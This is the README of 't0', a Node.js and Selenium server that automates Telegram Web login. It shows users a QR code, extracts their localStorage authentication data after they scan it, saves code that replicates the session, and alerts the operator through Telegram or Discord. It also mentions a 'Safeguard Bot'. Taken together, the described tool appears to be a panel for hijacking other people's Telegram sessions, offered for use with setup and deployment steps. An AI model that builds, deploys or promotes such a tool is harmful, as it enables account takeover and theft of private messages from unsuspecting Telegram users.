# t0

A Node.js server that automates Telegram Web login using Selenium WebDriver with real-time communication capabilities via WebSockets. t0 provides a comprehensive Telegram session management panel.

## Features

- 🚀 **Server Architecture**: Express.js server with Socket.IO for real-time communication
- 🤖 **Selenium Automation**: Automated Telegram Web login process
- 📱 **Real-time Updates**: Live progress updates via WebSocket connections
- 📸 **Screenshot Capture**: Automatic QR code and final page screenshots
- 💾 **LocalStorage Extraction**: Generates code to replicate authentication data
- 🎯 **Session Management**: Track multiple login sessions simultaneously
- 🌐 **Frontend Interface**: Built-in web interface for testing and monitoring
- 📱 **Telegram Notifications**: Instant notifications when authorization completes or fails

## Architecture

```
Frontend (Browser) ←→ WebSocket ←→ Server ←→ Selenium WebDriver ←→ Telegram Web
```

## Prerequisites

- Node.js (v14 or higher)
- Chrome browser installed
- ChromeDriver (automatically managed by selenium-webdriver)
- Telegram Bot Token (optional, for notifications)

## Installation

1. **Clone or download the project files**

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Configure Telegram Bot (Optional)**:
   - Create a `.env` file in the `selenium-admin` directory
   - Copy the contents from `env.example` and fill in your bot details:
   ```bash
   cp env.example .env
   ```
   - Get a bot token from [@BotFather](https://t.me/botfather) on Telegram
   - Get your chat ID by messaging [@userinfobot](https://t.me/userinfobot) or your bot
   - Update the `.env` file with your credentials:
   ```
   TELEGRAM_BOT_TOKEN=your_bot_token_here
   TELEGRAM_CHAT_ID=your_chat_id_here
   ```

4. **Start the server**:
   ```bash
   npm start
   ```

   Or for development with auto-restart:
   ```bash
   npm run dev
   ```

## Usage

### Starting the Server

The server will start on port 3000 by default. You can change this by setting the `PORT` environment variable.

```bash
PORT=8080 npm start
```

### Frontend Interface

1. Open your browser and navigate to `http://localhost:3000`
2. Use the web interface to:
   - Start Telegram login processes
   - Monitor real-time progress
   - View generated QR codes and screenshots
   - Download extracted data

### API Endpoints

#### HTTP Endpoints

- `GET /health` - Server health check
- `GET /api/sessions` - List all active sessions
- `GET /api/sessions/:sessionId` - Get specific session details
- `POST /api/login` - Initiate login process (returns session ID)
- `GET /api/test-telegram` - Test Telegram bot notification

#### WebSocket Events

**Client to Server:**
- `startTelegramLogin` - Start a new Telegram login process
- `getSessionStatus` - Get current session status

**Server to Client:**
- `telegramLoginUpdate` - Real-time updates during login process
- `sessionStatus` - Session status information

### WebSocket Event Types

The server sends various event types during the login process:

- `status` - General status updates
- `qr_code_ready` - QR code captured and ready for scanning
- `scan_progress` - QR code scanning progress
- `localStorage_extracted` - Authentication data extracted
- `screenshot_taken` - Final page screenshot captured
- `completed` - Process completed successfully
- `error` - Error occurred during process

## Notifications

The server can send instant notifications when authorization completes or fails. You can choose between Telegram, Discord, or both notification types.

### Notification Types

- **Authorization Complete**: Sent when a user successfully logs in
- **Error Notifications**: Sent when authorization fails
- **Test Notifications**: Sent when testing the integration

### Telegram Notifications

#### Setting Up Telegram Notifications

1. **Create a Telegram Bot**:
   - Message [@BotFather](https://t.me/botfather) on Telegram
   - Use `/newbot` command to create a new bot
   - Save the bot token provided

2. **Get Your Chat ID**:
   - Message [@userinfobot](https://t.me/userinfobot) to get your chat ID
   - Or message your bot and check the server logs

3. **Configure Environment Variables**:
   ```bash
   TELEGRAM_BOT_TOKEN=your_bot_token_here
   TELEGRAM_CHAT_ID=your_chat_id_here
   ```

### Discord Notifications

#### Setting Up Discord Notifications

1. **Create a Discord Server** (if you don't have one):
   - Open Discord and create a new server
   - Or use an existing server where you want to receive notifications

2. **Create a Text Channel for Notifications**:
   - In your Discord server, create a dedicated channel (e.g., `#telegram-notifications`)
   - This is where the authorization notifications will appear

3. **Set Up a Webhook**:
   - Right-click on the channel you created
   - Select **"Edit Channel"**
   - Go to the **"Integrations"** tab
   - Click **"Create Webhook"**
   - Give it a name like "Telegram Manager Bot"
   - Optionally upload an avatar/icon
   - Click **"Copy Webhook URL"** - **SAVE THIS URL!**

4. **Configure Environment Variables**:
   ```bash
   DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/your_webhook_url_here
   ```

### Notification Configuration

Configure which notification types to use:

```bash
# Use only Telegram (default)
NOTIFICATION_TYPE=telegram

# Use only Discord
NOTIFICATION_TYPE=discord

# Use both Telegram and Discord
NOTIFICATION_TYPE=both
```

### Testing Notifications

Test the notification system by visiting:
```
http://localhost:3000/api/test-notifications
```

Or run the test scripts directly:
```bash
# Test Telegram notifications
node test-telegram-bot.js

# Test Discord notifications
node test-discord-notifications.js
```

## Frontend Integration

### Basic WebSocket Connection

```javascript
const socket = io('http://localhost:3000');

// Start login process
socket.emit('startTelegramLogin', {
  sessionId: 'unique-session-id',
  parameters: { customParam: 'value' }
});

// Listen for updates
socket.on('telegramLoginUpdate', (data) => {
  console.log('Update:', data.event, data.data);
  
  switch (data.event) {
    case 'qr_code_ready':
      // Display QR code using data.qrCodeData (base64)
      break;
    case 'completed':
      // Process completed
      break;
    case 'error':
      // Handle error
      break;
  }
});
```

### Custom Frontend Implementation

You can integrate this server with any frontend framework:

- **React**: Use Socket.IO client library
- **Vue.js**: Use Socket.IO client library  
- **Angular**: Use Socket.IO client library
- **Vanilla JS**: Use the provided HTML file as a reference

## Configuration

### Environment Variables

- `PORT` - Server port (default: 3000)
- `NODE_ENV` - Environment mode (development/production)

### Selenium Configuration

The server uses Chrome browser by default. You can modify the browser configuration in `telegram-login-handler.js`:

```javascript
// For headless mode
driver = await new Builder()
  .forBrowser(Browser.CHROME)
  .setChromeOptions(new chrome.Options().headless())
  .build();

// For custom Chrome options
const chrome = require('selenium-webdriver/chrome');
const options = new chrome.Options();
options.addArguments('--no-sandbox');
options.addArguments('--disable-dev-shm-usage');

driver = await new Builder()
  .forBrowser(Browser.CHROME)
  .setChromeOptions(options)
  .build();
```

## File Structure

```
├── server.js                 # Main Express server with Socket.IO
├── telegram-login-handler.js # Selenium automation logic
├── public/
│   └── index.html           # Frontend interface
├── storage/                  # Organized file storage
│   ├── qr/                  # QR code screenshots
│   ├── chats/               # Chat/authentication screenshots
│   └── sessions/            # LocalStorage replication code files
├── docs/                     # Documentation files
│   ├── AUTH_SYSTEM.md       # Authentication system documentation
│   ├── DATABASE.md          # Database configuration documentation
│   ├── DISCORD_SETUP.md     # Discord integration setup guide
│   └── SAFEGUARD_BOT_README.md # Safeguard bot documentation
├── package.json             # Dependencies and scripts
└── README.md               # This file
```

## Generated Files

For each login session, the server generates files in organized directories:

1. **QR Code Screenshot** - `storage/qr/qr-code-{sessionId}-{timestamp}.png`
2. **LocalStorage Replication Code** - `storage/sessions/localStorage-replication-{sessionId}-{timestamp}.txt`
3. **Final Page Screenshot** - `storage/chats/telegram-authenticated-{sessionId}-{timestamp}.png`

## Security Considerations

- **CORS**: Currently set to allow all origins (`*`). Restrict this in production
- **Input Validation**: Validate all incoming parameters
- **Rate Limiting**: Consider implementing rate limiting for production use
- **Authentication**: Add authentication if multiple users will access the server

## Troubleshooting

### Common Issues

1. **Chrome not starting**: Ensure Chrome is installed and accessible
2. **QR code not found**: Telegram Web interface may have changed selectors
3. **Connection refused**: Check if port 3000 is available
4. **Selenium errors**: Ensure ChromeDriver is compatible with your Chrome version

### Debug Mode

Enable debug logging by setting the environment variable:

```bash
DEBUG=* npm start
```

## Production Deployment

1. **Environment**: Set `NODE_ENV=production`
2. **Port**: Use environment variable for port configuration
3. **Process Manager**: Use PM2 or similar for process management
4. **Reverse Proxy**: Use Nginx or Apache as reverse proxy
5. **SSL**: Enable HTTPS for production use

## Documentation

For detailed information about specific features and configurations, see the documentation files in the `docs/` directory:

- **[Authentication System](docs/AUTH_SYSTEM.md)** - User authentication and authorization system
- **[Database Configuration](docs/DATABASE.md)** - Database setup and Prisma configuration
- **[Discord Setup](docs/DISCORD_SETUP.md)** - Discord bot integration and notifications
- **[Safeguard Bot](docs/SAFEGUARD_BOT_README.md)** - Telegram safeguard bot implementation

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This project is open source and available under the MIT License. 